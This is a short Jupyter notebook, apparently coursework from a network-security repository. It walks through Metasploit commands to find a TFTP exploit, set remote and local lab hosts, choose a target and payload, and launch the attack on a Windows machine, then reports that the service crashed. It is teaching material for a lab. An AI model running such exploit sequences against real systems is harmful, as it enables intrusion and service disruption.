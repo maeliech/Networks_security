{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "### Metasploit"
      ],
      "metadata": {
        "id": "XRdkhx2JHYjy"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "kWsUAZ2-HTzf"
      },
      "outputs": [],
      "source": [
        "# start by starting metasploit\n",
        "./opt/metasploit-framework/mfsconsole\n",
        "\n",
        "# displays all supported exploits\n",
        "search exploits\n",
        "\n",
        "# searching for a particular exploit: here tftp on windows\n",
        "search tftp\n",
        "\n",
        "# displays info about the exploit number 24\n",
        "info 24\n",
        "\n",
        "# L left local, R right remote\n",
        "set RHOST 172.16.0.3\n",
        "set LHOST 192.168.1.2\n",
        "\n",
        "# available targets\n",
        "show targets\n",
        "\n",
        "# select target\n",
        "set target 7\n",
        "\n",
        "show payloads\n",
        "# selecting the payload number 10\n",
        "set payload 10\n",
        "\n",
        "# displays info on hosts, ports, target...\n",
        "show options\n",
        "\n",
        "# all set: now attack\n",
        "exploit\n"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "On our windows machine we get an error saying the tftp protocol crashed. The exploit worked"
      ],
      "metadata": {
        "id": "aLJ9Lc2bJM3B"
      }
    }
  ]
}